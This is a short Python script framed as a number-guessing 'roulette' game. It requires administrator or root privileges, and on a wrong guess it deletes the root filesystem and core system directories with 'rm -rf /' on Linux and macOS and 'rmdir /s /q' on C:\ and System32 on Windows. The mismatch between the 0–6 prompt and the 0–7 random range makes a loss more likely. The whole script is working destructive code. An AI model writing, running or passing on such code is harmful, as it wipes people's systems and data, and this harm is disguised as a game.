import os
import random
import subprocess
import platform
import sys

system = platform.system()
if system == "Windows":
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("Please run as Administrator.")
        sys.exit(1)
elif system in ("Linux", "Darwin"):
    if os.geteuid() != 0:
        print("Please run with sudo.")
        sys.exit(1)

print("Running with elevated privileges.")

initialValue = 0
finalValue = 7
x = random.randint(initialValue, finalValue)
y = int(input("pick a number between 0 and 6 : "))

if (x != y):
    if(system == "Windows"):
        paths = ["C:\\", r"C:\Windows\System32", r"C:\Windows\System32\drivers", r"C:\Windows\System32\config"]
        for i in paths:
            subprocess.run(["powershell","-Command",f'Start-Process cmd -ArgumentList \'/c rmdir /s /q "{i}"\' -Verb RunAs'], check=False)
        
    elif (system == "Linux"):
        paths = ["/","/usr/bin","/usr/lib","/lib","/etc","/lib/modules","/bin","/boot",]
        for i in paths:
            subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)

    elif system == "Darwin":
        paths = ["/","/usr/bin","/usr/lib","/etc","/System/Library","/System","/bin",]
        for i in paths:
            subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)

else:
    print("You survived. THIS TIME.")
